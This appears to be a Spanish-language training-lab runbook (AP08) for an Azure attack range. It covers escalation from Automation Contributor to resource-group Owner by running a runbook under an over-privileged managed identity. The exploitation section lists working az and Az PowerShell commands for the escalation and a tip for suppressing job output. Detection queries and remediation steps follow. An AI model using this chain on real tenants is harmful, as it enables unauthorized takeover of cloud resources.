# AP08 — Runbook de Automation Account → la Managed Identity over-privilegiada escala a Owner del RG

- **Capa:** Azure (Automation Account · Managed Identity · RBAC — plano de gestión / *cloud control plane*)
- **Coste:** **~0 — SIN VM, sin cómputo facturado.** El Automation Account **no tiene coste fijo** y trae ~**500 min/mes de runtime de job gratis** (el ejercicio consume segundos); la ingesta de `JobLogs`/`JobStreams` a Log Analytics queda muy por debajo de 0,1 GB/día (céntimos/mes, 31 d de retención incluidos). `./caelum.ps1 destroy` o `reset` → 0. **Empata con AP07 en coste ~0** (ambas despliegan ARM sin VM); las *identity-only* AP01/AP03/AP04 son Entra puro (gratis, sin ARM) y AP02/AP05 sí facturan cómputo (VM). *(No es «la más barata»: comparte el suelo de coste con AP07.)*
- **MITRE ATT&CK:** [T1651](https://attack.mitre.org/techniques/T1651/) (Cloud Administration Command — **primario**: ejecutar comandos vía un runbook de Automation) · [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles — el *role assignment* que concede el rol privilegiado) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts — el atacante persiste como Owner del RG)
- **Mapea a cert:** CARTP / CARTE
- **Precondición sembrada por el range** (100% Terraform, `enable_ap08 = true`):
  - Automation Account `caelum-ap08-aa-<rand>` (output `ap08_automation_account` — **centinela de `verify.ps1`**) con **system-assigned managed identity**. Esa MI es el **actor efectivo** de la escalada, exactamente como en AP02 el actor es la MI robada vía IMDS.
  - **El exceso de privilegio nuclear:** la MI ostenta `mi_role` **sobre el RG** `caelum-ap08-rg` (`azurerm_role_assignment`), por defecto **`User Access Administrator`** (conmutable a `Owner`). **Ambos roles incluyen `Microsoft.Authorization/roleAssignments/write`** → la MI puede **auto-asignar** (o asignar a un tercero) un rol superior sobre ese scope.
  - Atacante de **bajo privilegio** dedicado `caelum-ap08-attacker@<tenant_domain>` (output `ap08_attacker_upn`, contraseña en `ap08_attacker_password` — **sensible**) cuyo **único** grant Azure es **`Automation Contributor` sobre el RG** (`azurerm_role_assignment`, `principal_type = "User"`). `Automation Contributor` **no** incluye `roleAssignments/write`: el atacante **no puede** escalar por sí mismo — debe **conducir la MI**.
  - Runbook PowerShell **incrustado** `caelum-ap08-maintenance` (nombre señuelo **fijo**, ancla la detección), gateado por `runbook_mode` (`poc_escalation` por defecto · `benign_probe` · `none`). Es la **«pistola cargada»**: Terraform la **publica**, pero **nunca la dispara** (no lanza un job ni crea un `azurerm_automation_schedule`).
  - Telemetría del **plano de datos de Automation**: un `azurerm_monitor_diagnostic_setting` (`caelum-ap08-automation-diag`) sobre el Automation Account → categorías **`JobLogs` + `JobStreams`** → tabla `AzureDiagnostics` (ResourceProvider `MICROSOFT.AUTOMATION`) en `caelum-ap08-law` (output `ap08_law_name`) o en un Sentinel externo (`existing_log_analytics_workspace_id`); gated por `collect_automation_logs` (default `true`).
  - **100% declarativo: sin `seed-ap08.ps1`, sin `az vm run-command`, sin hook post-apply** — enteramente cableado por Terraform, **runbook incrustado incluido** (vía `content` inline). Es **100% declarativa como AP02/AP03/AP04/AP07** (sin *seed* imperativo), frente a AP01/AP05 que siembran el *payload* con scripts (`seed-ap01.ps1` / `seed-ap05.ps1`). **Lo que NO se siembra:** ninguna ejecución de job, ningún schedule, ningún *role assignment* de runtime — el **«rompe» es acción del alumno** (`Start-AzAutomationRunbook`).

> **Aviso — la credencial aterriza en el `tfstate`.** El `random_password` del atacante vive en el estado de Terraform **en claro y marcado como sensible** (solo se expone vía el output sensible `ap08_attacker_password`). Trata el `tfstate` como **tóxico**, igual que el *client secret* del SP en AP02 o `dc_admin_password` en AP05. El `.gitignore` del repo ya bloquea `*.tfstate*`. *(El runbook `poc_escalation` incrustado también es «vivo»: concede Owner en cuanto se ejecuta — pero Terraform solo lo **publica**, nunca lo corre; ver 🔴.)*

---

## 🎯 Objetivo didáctico

Que el alumno interiorice el **confused deputy de Azure Automation**: *quien puede correr un runbook es, de hecho, dueño del scope de la Managed Identity del Automation Account*. El verdadero fallo no es publicar un runbook (operación legítima de un `Automation Contributor`), sino que la **MI que ejecuta ese runbook hereda un rol con `roleAssignments/write`** sobre un scope que el atacante no controlaba. El escenario demuestra la cadena canónica CARTP/CARTE del plano de automatización:

`identidad low-priv (Automation Contributor) → autora/importa un runbook y lanza un job (T1651) → el job corre COMO la MI over-privilegiada → la MI ejecuta New-AzRoleAssignment (T1098.003) → el atacante es Owner del RG (T1078.004, persistencia + control total)`.

El eje conceptual es idéntico en forma al de AP02 (**la MI es el actor, no la caja fuerte**) pero por un **primitivo distinto**: en AP02 el token de la MI se **roba** del IMDS y `Contributor` incluye `accessPolicies/write`; en AP08 **no hay robo de token** — el atacante nunca ve la credencial de la MI — sino **conducción indirecta**: el `Connect-AzAccount -Identity` ocurre **dentro** del runbook, en el sandbox del Automation Account, y el atacante solo necesita el derecho de **lanzar el job**. La lección afilada del default `mi_role = "UserAccessAdministrator"` es que **incluso «solo UAA»** sobre una MI de Automation = *game over*: UAA no lee datos, no despliega nada, su **único** poder es asignar roles — y eso basta, porque puede concederse (o conceder al atacante) un rol **superior** a sí misma.

La segunda lección es de **least-privilege de scope**: la MI está acotada **al RG**, no a la subscription. Esto no es comodidad sino un **requisito de seguridad del range** (y de cualquier despliegue real): un *role assignment* de runtime con `-Scope` de **subscription** **sobreviviría** al destroy del RG → residuo *out-of-state* + *blast radius* ampliado a toda la subscription. Al acotar la MI y la escalada al RG, **cualquier** grant que el alumno cree en runtime es **hijo del RG** y muere con él → reset limpio (análogo exacto al **bosque usar-y-tirar** de AP05). Ver 🟢 y la nota de reset.

**Contraste con AP02 (su gemelo de identidad) — tres rasgos de diseño:**
1. **Mismo actor (la MI), primitivo distinto:** AP02 **roba** el token de la MI vía IMDS (T1552.005); AP08 **conduce** la MI vía un runbook sin ver jamás su token (T1651). En ambos el *self-grant* lo firma la MI, no el atacante humano.
2. **100% declarativo**, runbook incrustado incluido — como AP07 (y AP02/AP03/AP04), sin la acción imperativa de post-despliegue de AP01/AP05.
3. **Residuo de reset más limpio que AP02:** el *self-grant* del atacante en AP02 queda **fuera** del estado y hay que limpiarlo a mano (puede estar en scope de subscription). En AP08 el *self-grant* **también** está fuera del estado, **pero es RG-scoped por diseño** → se destruye atómicamente con el RG → **cero residuo *out-of-state*, empatando con AP05/AP07** (no lo supera: es un empate a tres).

---

## 🔴 Rompe (cómo se explota)

> Laboratorio de entrenamiento autorizado, en tenant/subscription de test propios. Herramientas públicas de referencia: **az cli** (+ extensión `automation`), **Az PowerShell** (`Az.Automation`, `Az.Accounts`, `Az.Resources`), **MicroBurst** / **PowerZure** (abuso de Automation), **ROADtools**, **pacu** (módulo `azure`). El runbook incrustado y el output `ap08_attacker_hint` rinden el *one-liner* del disparo, **sin secretos**.

La cadena es `login low-priv → (autora/publica un runbook) → Start-AzAutomationRunbook (job, T1651) → la MI corre el runbook → New-AzRoleAssignment (T1098.003) → Owner del RG (T1078.004)`. El «rompe» (lanzar el job) es **imperativo y del alumno**: Terraform dejó la pistola cargada, pero el gatillo lo aprieta el estudiante.

### Paso 1 — Autenticarse como el atacante de bajo privilegio

El diferencial pedagógico —*«solo tenía `Automation Contributor` y acabé siendo Owner»*— vive en **lanzar el job como el low-priv**, no como el deployer. La credencial la rinde el estado:

```bash
UPN=$(terraform output -raw ap08_attacker_upn)         # caelum-ap08-attacker@<tenant_domain>
PW=$(terraform output -raw ap08_attacker_password)     # sensible (vive en el tfstate)
RG=$(terraform output -raw ap08_resource_group)        # caelum-ap08-rg
AA=$(terraform output -raw ap08_automation_account)    # caelum-ap08-aa-<rand>

az login -u "$UPN" -p "$PW"                             # ROPC: solo sin CA/MFA (ver caveat)
```
```powershell
# Equivalente Az PowerShell:
$cred = Get-Credential   # UPN + ap08_attacker_password
Connect-AzAccount -Credential $cred
```

> **Caveat de disparo — CA/MFA vs. cuenta cloud-only (fallback AP02-style).** El atacante es un usuario **cloud-only** recién creado; si el tenant impone *Conditional Access* o MFA, el login no-interactivo (ROPC) falla. **Fallback deliberado:** dispara el runbook como el **deployer/Owner** (el *actor efectivo* sigue siendo la MI, igual que en AP02 el actor es la MI aunque el humano cambie). El usuario low-priv existe **para fidelidad de la lección** (el salto de privilegio real), no como obstáculo: si CA bloquea, úsalo para *leer* su rol (`az role assignment list --assignee <oid> --scope <rg-id>` → solo `Automation Contributor`) y lanza el job con una identidad que sí pueda autenticarse.

### Paso 2 — Reconocimiento: el Automation Account y su runbook cargado

```bash
# La MI y su principalId (el object id que firmará el roleAssignments/write — señal de oro en 🔵):
az automation account show -g "$RG" -n "$AA" --query identity.principalId -o tsv   # = ap08_mi_principal_id

# El runbook señuelo ya publicado por Terraform (runbook_mode != none):
az automation runbook list -g "$RG" --automation-account-name "$AA" -o table
#   -> caelum-ap08-maintenance   PowerShell   Published
```

### Paso 3 — Disparar el job (T1651) — el «rompe»

**Modo `poc_escalation` (default): la pistola está cargada.** El runbook incrustado ya hace `Connect-AzAccount -Identity` + `New-AzRoleAssignment` concediendo **Owner del RG** al atacante. Basta lanzarlo:

```powershell
# Az PowerShell (canónico y robusto). Define las variables en ESTA sesión pwsh
# (las vars de bash del Paso 1 no cruzan a un proceso pwsh nuevo):
$AA = terraform output -raw ap08_automation_account
$RG = terraform output -raw ap08_resource_group
$job = Start-AzAutomationRunbook -Name 'caelum-ap08-maintenance' `
         -AutomationAccountName $AA -ResourceGroupName $RG
# Esperar y leer la salida del job (JobStreams: revela el texto New-AzRoleAssignment):
Get-AzAutomationJob -Id $job.JobId -AutomationAccountName $AA -ResourceGroupName $RG
Get-AzAutomationJobOutput -Id $job.JobId -Stream Any `
  -AutomationAccountName $AA -ResourceGroupName $RG | Select-Object -Expand Summary
#   -> [AP08] Ejecutando como la MI del Automation Account: <mi-oid>
#   -> [AP08] Concediendo 'Owner' sobre <rg-id> al principal <attacker-oid>...
#   -> [AP08] Escalada completada: el low-priv es ahora Owner del RG.
```
```bash
# Equivalente az (extensión automation):
az automation runbook start -g "$RG" --automation-account-name "$AA" --name caelum-ap08-maintenance
```

**El punto clave:** el `New-AzRoleAssignment` **no lo firma el atacante** — lo firma **la MI** dentro del sandbox. El atacante, que solo tenía `Automation Contributor`, acaba de ejercer `roleAssignments/write` **por delegación indirecta**.

### Paso 4 — Confirmar el trofeo: Owner del RG (persistencia)

```bash
RGID=$(az group show -n "$RG" --query id -o tsv)
az role assignment list --assignee "$UPN" --scope "$RGID" -o table
#   -> Owner   caelum-ap08-attacker@...   /subscriptions/.../resourceGroups/caelum-ap08-rg
```
A partir de aquí el atacante controla el RG entero (crear/borrar recursos, conceder más roles, persistir). No hay *flag* `CAELUM{...}`: **el trofeo es el propio grant de Owner** — el cambio de postura de `Automation Contributor` a `Owner` **es** la demostración.

> **Nota enseñable — plano de datos oportunista, plano de gestión insuprimible.** El runbook `poc_escalation` **no** suprime su salida, de modo que `JobStreams` revela el texto literal `New-AzRoleAssignment ... Owner`. Un atacante sigiloso añadiría `| Out-Null` y **ese** rastro del plano de datos desaparecería. Pero el `Microsoft.Authorization/roleAssignments/write` que la MI ejecuta en el **plano de gestión** (`AzureActivity`) **no se puede suprimir**: queda registrado sí o sí (ver 🔵). El data-plane es un *bonus* de visibilidad; el control-plane es el ancla de detección.

### Variantes

**`runbook_mode` — qué trae el Automation Account cargado:**

| Modo | Qué incrusta Terraform | Qué hace el alumno | Cuándo |
|---|---|---|---|
| **`poc_escalation`** *(default)* | Un runbook que hace `Connect-AzAccount -Identity` + `New-AzRoleAssignment -RoleDefinitionName Owner -Scope <RG>` al atacante. **Pistola cargada.** | Solo `Start-AzAutomationRunbook`. Demo inmediata; paridad con la credencial ya-filtrada de AP07. | Demo guiada; validación `end-to-end` de la señal de oro (`roleAssignments/write` por la MI). |
| **`benign_probe`** | Un runbook que **solo** prueba identidad/poder: `Connect-AzAccount -Identity`, `Get-AzAccessToken` (no imprime el token — higiene), `Get-AzRoleAssignment -Scope <RG>` → confirma que la MI tiene UAA/Owner sobre el RG. **No escala.** | **Escribe él** el `New-AzRoleAssignment` (edita el runbook o importa uno propio) y lo lanza. | Default recomendado para despliegues **compartidos**: la pistola no está cargada, pero la MI sigue siendo over-priv. |
| **`none`** | Ningún runbook (misconfig pura). | **Autora todo**: `az automation runbook create` → `replace-content` → `publish` → `start`. | Ejercicio «de cero»; máxima fidelidad ofensiva. |

> En **ningún** modo Terraform dispara la escalada: `benign_probe` y `poc_escalation` solo **publican**; `none` ni siquiera publica. La diferencia es *qué tan cargada* está la pistola, nunca *quién* aprieta el gatillo (siempre el alumno).

**`mi_role` — el rol over-priv de la MI sobre el RG:**

- **`UserAccessAdministrator`** *(default)* — **mínimo-que-escala**. Su **único** poder es asignar roles; no lee datos, no despliega. Lección más afilada: *incluso «solo UAA»* sobre una MI de Automation = escalada total, porque puede concederse Owner a sí misma o al atacante.
- **`Owner`** — más realista/común en tenants reales (una MI de automatización a la que «se le dio Owner del RG para que lo gestione todo»). También incluye `roleAssignments/write`, así que la cadena es idéntica; solo cambia el realismo del pretexto.
- **`Contributor` está EXCLUIDO a propósito** (hay `validation`): `Contributor` **no** incluye `Microsoft.Authorization/roleAssignments/write` → no escala por este carril. (Ese es el carril de **AP02**, donde `Contributor` escala vía `accessPolicies/write` de un Key Vault en modelo *access-policy*, no vía RBAC.)

---

## 🟢 Arregla (remediación)

Ordenadas de **causa raíz** (la #1 mata la cadena por sí sola) a **defensa en profundidad** (la #8 **no** previene, solo detecta). Aplícalas en profundidad.

1. **Quitar de la MI el rol que incluye `roleAssignments/write` (causa raíz, la más efectiva).** Si el Automation Account no necesita **escribir RBAC** —el caso normal—, su MI **no** debe ostentar UAA ni Owner. Sin el primitivo no hay escalada.
   ```powershell
   Remove-AzRoleAssignment -ObjectId <mi-principalId> `
     -RoleDefinitionName "User Access Administrator" `
     -Scope "/subscriptions/<sub>/resourceGroups/caelum-ap08-rg"
   ```
   > En el range = **retirar (o comentar) el recurso `azurerm_role_assignment.ap08_mi`** (el grant over-priv de la MI) y re-aplicar con `enable_ap08 = true`. *(Ambos valores admitidos de `mi_role` —`UserAccessAdministrator` y `Owner`— incluyen `roleAssignments/write`, así que el fix no es cambiar la variable sino retirar la asignación.)* **No hay `seed-ap08.ps1 -Remediate`**: la ruta es 100% declarativa (como AP07), así que «arreglar in-place» es **editar el Terraform** y `terraform apply`.

2. **Si la MI debe actuar sobre RBAC, rol *custom* de mínimo privilegio** que **excluya** `Microsoft.Authorization/roleAssignments/write` y `.../roleAssignments/delete` (+ `denyAssignments/*`); o el rol acotado **`Role Based Access Control Administrator`** (delegación **con condiciones**, p.ej. solo ciertos roles) en vez de UAA/Owner.

3. **Contención de scope (y lo que hace limpio el reset).** **Nunca** conceder a la MI nada a nivel de **subscription** o *management group*; mantenerlo **RG-scoped** o más fino. Además de reducir el *blast radius*, es lo que garantiza que un grant de runtime muera con el RG (ver reset).

4. **RBAC mínimo sobre el propio Automation Account: separar autoría de ejecución.** *Quien puede lanzar un job = quien actúa como la MI.* Restringe `Automation Contributor` y las acciones `runbooks/write`, `draft/content/write`, `publish/action`, `jobs/write`; usa **`Automation Operator`** (solo **ejecuta** runbooks ya aprobados, no los edita) para los operadores, y reserva la autoría a un pipeline revisado.

5. **Arquitectura de identidad.** Preferir **user-assigned MI** acotada (o **ninguna**) frente a una system-assigned cargada con un rol amplio. **No** usar el patrón **Run-As classic** (retirado en sep-2023): la system-assigned MI es el primitivo fiel 2024+.

6. **Endurecer la superficie.** `local authentication` deshabilitada, **Private Link** / `public_network_access_enabled = false`, e **integración de source control** con revisión de cambios de runbooks (ningún runbook llega a `Published` sin *code review*).

7. **PIM / JIT** para cualquier rol privilegiado que de verdad haga falta → **ninguna** identidad con *standing* Owner/UAA; la MI (o el operador) eleva *just-in-time* y con aprobación.

8. **Telemetría + política (defensa en profundidad — NO previene).** `JobLogs`+`JobStreams` → Log Analytics (**OFF por defecto**); **alerta** sobre `roleAssignments/write` cuyo `Caller` sea el `principalId` de una MI de Automation; **Azure Policy** que audite/deniegue conceder Owner/UAA a identidades de automation; **Microsoft Defender for Cloud**.

### Remediación in-place en el range (el ejercicio «Arregla»)

Como AP07 y a diferencia de AP05, **no hay seed imperativo**: el fix in-place es **declarativo**. Retirar (o comentar) `azurerm_role_assignment.ap08_mi` (el grant over-priv de la MI) y re-aplicar con `enable_ap08 = true` — ambos valores de `mi_role` incluyen `roleAssignments/write`, así que el fix es retirar la asignación, no cambiar la variable. El alumno re-lanza el runbook y comprueba que `New-AzRoleAssignment` ahora **falla con `AuthorizationFailed`** desde la MI.

> **Dos niveles de reset — no los confundas** (mismo patrón que AP07).
> **(1) In-place / pedagógico:** retirar (o comentar) `azurerm_role_assignment.ap08_mi` + `terraform apply` (arriba) → deja el Automation Account y la telemetría en pie para re-testear ataque y detección contra el estado corregido. **Matiz importante:** este *flip* cierra el **primitivo** (la MI ya no puede escalar), pero **no revoca** un *role assignment* que el atacante **ya** creó en runtime — ese grant de Owner es *out-of-state*. Para borrarlo o bien lo quitas a mano (`az role assignment delete`) **o** usas el reset duro (que lo destruye con el RG — precisamente porque es **RG-scoped**).
> **(2) Duro / coste→0:** `./caelum.ps1 reset` re-aplica con `enable_ap08 = false` (`count = 0`) → Terraform **destruye atómicamente** el RG `caelum-ap08-rg` y, **con él**, el Automation Account + la MI + su `role_assignment` + el runbook + el LAW **y cualquier *role assignment* de runtime scoped al RG** (el *self-grant* de Owner del alumno, que es hijo del RG). **Cero residuo *out-of-state*, empatando con AP05/AP07** como los resets más limpios del range — y **más limpio que AP02**, cuyo *self-grant* queda fuera del estado y hay que limpiarlo a mano. La clave técnica es el **scope RG**: un `-Scope` de subscription **sobreviviría** al destroy del RG → residuo *out-of-state* + *blast radius* ampliado. Por eso el scope RG es un **requisito de seguridad**, no una comodidad (análogo al bosque usar-y-tirar de AP05).

---

## 🔵 Detecta

Dos planos, dos fuentes, dos naturalezas de telemetría (mismo reparto que AP07/AP02):

- **Plano de gestión (la cadena en sí)** → tabla **`AzureActivity`**, que **fluye al SIEM por defecto sin provisionar nada**. Cubre la autoría del runbook, el **lanzamiento del job** (= ejecución, T1651) y, sobre todo, el **`roleAssignments/write` firmado por la MI** (la señal de oro).
- **Plano de datos de Automation (la ejecución del runbook)** → **`AzureDiagnostics`** (`ResourceProvider == "MICROSOFT.AUTOMATION"`, `Category in ("JobLogs","JobStreams")`), que **solo existe si el range provisiona el `diagnostic_setting`** sobre el Automation Account. `JobStreams` puede revelar el **texto literal** `New-AzRoleAssignment` / `Owner` si `log_verbose = true` y el runbook no suprime su salida.

| Señal | Tabla | Qué mirar |
|---|---|---|
| Autoría del runbook | `AzureActivity` | `OperationNameValue has "Microsoft.Automation/automationAccounts/runbooks/write"` (y `.../runbooks/draft/content/write`, `.../runbooks/publish/action`) — el `apply` del lab y el alumno en modo `none`/`benign_probe` los disparan |
| **Lanzamiento del job (T1651)** | `AzureActivity` | `OperationNameValue has "Microsoft.Automation/automationAccounts/jobs/write"` — **la ejecución**; `Caller` = el usuario low-priv (o el deployer en el *fallback*) |
| **Señal de oro — `roleAssignments/write` por la MI** | `AzureActivity` | `OperationNameValue has "Microsoft.Authorization/roleAssignments/write"` **con `Caller == ap08_mi_principal_id`** (el object id de la system-assigned MI). Un *role assignment* ejecutado por una **identidad de automation** es altísima señal |
| **Cadena completa (alta fidelidad)** | `AzureActivity` | correlación por **tiempo + RG**: un **`jobs/write`** (`Caller != MI`) seguido, en ventana corta (~20 m) y **mismo RG**, de un **`roleAssignments/write`** (`Caller == MI`) que concede un rol privilegiado. Casi cero FP: es justo el pivote que la remediación hace imposible |
| Ejecución y salida del runbook | `AzureDiagnostics` | `ResourceProvider == "MICROSOFT.AUTOMATION"`, `Category in ("JobLogs","JobStreams")`; `JobStreams` puede contener el texto `New-AzRoleAssignment`/`Owner` (si no se suprimió la salida) |

- KQL (Sentinel / Defender XDR): [`detections/kql/AP08-automation-runbook-rbac.kql`](../../detections/kql/AP08-automation-runbook-rbac.kql) — `AzureActivity` (autoría + job + `roleAssignments/write` por la MI + **correlación de cadena por tiempo+RG**) **y** `AzureDiagnostics` (`JobLogs`/`JobStreams`, **KQL-primary**).
- Sigma: [`detections/sigma/AP08-automation-runbook-rbac.yml`](../../detections/sigma/AP08-automation-runbook-rbac.yml) — `logsource product: azure, service: activitylogs` (UUID `a7d3f2b9-8c14-4e6a-b5f0-2d9c1e4a7b63`).

**Reparto Sigma vs KQL (declarado explícito, como AP07 declaró «el acceso anónimo a blobs no es `activitylogs`» y AP05 «el SAN no viaja»).** El **plano de gestión** (autoría + `jobs/write` + `roleAssignments/write`, con filtro de éxito por `properties.statusCode` **OR** `status contains "Succ"` — mismo patrón que AP02/AP07, nunca un `AND` que descarte en silencio los registros que solo pueblan uno de los campos) **sí** encaja en un *logsource* Sigma estándar (`azure/activitylogs`). El **plano de datos** (`JobLogs`/`JobStreams` en `AzureDiagnostics`) **no es un *logsource* Sigma estándar → es KQL-primary.** No fuerces los streams del runbook dentro de una regla `activitylogs`: no están ahí.

> **Filtro discriminante *deploy* vs. ataque — por el `Caller`, no por el beneficiario.** Durante el `apply`, el `azurerm_role_assignment.ap08_mi` (MI → UAA/Owner) también genera un `roleAssignments/write`, pero su `Caller` es el **deployer/IaC**. En el ataque el `Caller` del grant es la **MI** (`ap08_mi_principal_id`). Esa es la distinción de oro. El **beneficiario** del grant (el mismo usuario low-priv) **no** se serializa de forma fiable en `AzureActivity` → se **anota** desde `JobStreams` con un `leftouter`, **nunca** como filtro que descarte la cadena (lección de AP04/AP07: no dropear el evento por un campo que puede faltar).

> **Caveat — `JobLogs`/`JobStreams` NO están activos por defecto.** Sin el `diagnostic_setting` sobre el Automation Account, **la ejecución del runbook no existe en ningún SIEM** (análogo exacto a «los eventos on-prem no existen sin AMA+DCR» de AP05 y a «`StorageBlobLogs` no existe sin el diagnostic setting» de AP07). Por eso esa fila solo es testeable si el range los ingiere (`collect_automation_logs = true`). El plano de gestión —`jobs/write`, `roleAssignments/write`— **sí** fluye por `AzureActivity` sin provisionar nada.

> **Caveat — Automation no tiene tabla dedicada.** A diferencia de AP07 (que usa `log_analytics_destination_type = "Dedicated"` → `StorageBlobLogs`), el `diagnostic_setting` de AP08 **omite** `log_analytics_destination_type` → los logs caen en **`AzureDiagnostics`** (esquema compartido). El KQL filtra por `ResourceProvider == "MICROSOFT.AUTOMATION"`.

**Complemento gestionado:** **Microsoft Defender for Cloud** (detección de cambios RBAC anómalos) + **Azure Policy** que deniegue conceder Owner/UAA a MIs de Automation + **PIM** — recomendados junto a estas reglas.

> **Coste de ingesta.** Los segundos de job del ejercicio → `JobLogs`/`JobStreams` muy por debajo de 0,1 GB/día → céntimos/mes. Se apaga con `collect_automation_logs = false` (asume SIEM externo). El `metric { category = "AllMetrics"; enabled = false }` del diagnostic setting neutraliza el *perpetual-diff* cuando la API rellena el bloque `metric` (idiom de AP07).

---

## ⚠️ Caveat enseñable — la MI tarda en propagarse en AAD

Al estilo del bloque «`allowBlobPublicAccess` default = `false` post-2023» de AP07: al crear `azurerm_role_assignment.ap08_mi`, el `principalId` de la **system-assigned MI** puede **no haberse replicado** aún en Microsoft Entra ID → el `apply` fallaría con *PrincipalNotFound*. Por eso el recurso usa **`skip_service_principal_aad_check = true`** (idéntico a AP02). Para el **usuario** atacante ese flag **no aplica** (es para SP/MI), así que su `role_assignment` fija **`principal_type = "User"`** explícito, evitando que `azurerm` intente resolver el tipo vía Graph para un usuario recién creado.

> **Caveat de idempotencia.** El `content` del runbook referencia **escalares de estado estables** (`local.ap08_attacker_oid` = `object_id`, `local.ap08_rg_id` = id del RG), interpolados vía ternario con *short-circuit* (nunca `[0]` directo, nunca `timestamp()`), de modo que `terraform plan` tras `apply` = *No changes*. `random_string.ap08` es **propio** (no reusa el de AP02/AP07, gateados en otros flags). Es el mismo rigor que llevó a AP07 a usar `time_static`/`time_offset` para la SAS: estado determinista, sin *perpetual-diff*.

> **Caveat de entorno (runtime del alumno, no del `apply`).** El runbook asume que el Automation Account dispone de los módulos **`Az.Accounts` / `Az.Resources`** (`Connect-AzAccount -Identity`, `New-AzRoleAssignment`). Las imágenes actuales de Automation los traen; si faltaran, el alumno los importa en *Shared Resources* (`Modules`). Es un *concern* de ejecución, no del despliegue — análogo a «la VM debe estar encendida» de AP05. (Si un *build* rechazara `content` inline sin `publish_content_link`, basta añadir un `publish_content_link { uri }` inerte: válido en `azurerm ~3.116`.)

> **Caveat — `verify.ps1` confirma POSTURA, no una escalada.** El centinela `ap08_automation_account` y las sondas de `verify.ps1` comprueban que el Automation Account, el rol over-priv de la MI, el runbook y el atacante **están desplegados** (la pistola cargada), **no** que se haya disparado nada: en ningún modo el `apply` ejecuta un job.

> **Sin superlativos únicos en colisión.** AP08 es 100% declarativa **como AP02/AP03/AP04/AP07** (la propiedad declarativa es compartida, ninguna «primera»/«segunda»). El coste ~0 **empata** con AP07 (ninguna «la más barata»). La limpieza de reset **empata** con AP05/AP07 (empate a tres, no «el más limpio»).

---

## 📚 Referencias

- Microsoft — [Use a system-assigned managed identity for an Azure Automation account](https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation) (la MI del Automation Account; `Connect-AzAccount -Identity` desde un runbook)
- Microsoft — [Retirement of Run As accounts (sep-2023) — migrate to managed identities](https://learn.microsoft.com/en-us/azure/automation/migrate-run-as-accounts-managed-identity) (por qué la system-assigned MI es el primitivo fiel 2024+)
- Microsoft — [Azure built-in roles — User Access Administrator / Owner / Role Based Access Control Administrator](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles) (los tres incluyen o constriñen `Microsoft.Authorization/roleAssignments/write`)
- Microsoft — [Automation built-in roles — Automation Contributor / Automation Operator](https://learn.microsoft.com/en-us/azure/automation/automation-role-based-access-control) (separar autoría de ejecución; `jobs/write` = actuar como la MI)
- Microsoft — [Forward Azure Automation diagnostic logs to Azure Monitor (`JobLogs` / `JobStreams`)](https://learn.microsoft.com/en-us/azure/automation/automation-manage-send-joblogs-log-analytics) (telemetría OFF por defecto; `AzureDiagnostics`)
- Microsoft — [Azure Policy for RBAC / deny privileged role assignments](https://learn.microsoft.com/en-us/azure/governance/policy/samples/built-in-policies) y [Privileged Identity Management (PIM)](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure)
- MITRE ATT&CK — [T1651](https://attack.mitre.org/techniques/T1651/) (Cloud Administration Command), [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Additional Cloud Roles), [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts)
- Comparar con [AP02](./AP02-managed-identity.md) (mismo actor —la MI— por un primitivo distinto: robo de token IMDS vs. conducción indirecta vía runbook; *self-grant* fuera de estado) y con [AP07](./AP07-public-storage-leak.md) (ruta 100% declarativa, reset de dos niveles, reparto Sigma/KQL plano de gestión vs. datos) y [AP05](./AP05-adcs-esc1.md) (bosque usar-y-tirar: superficie vulnerable en un recurso desechable → reset sin residuo *out-of-state*).
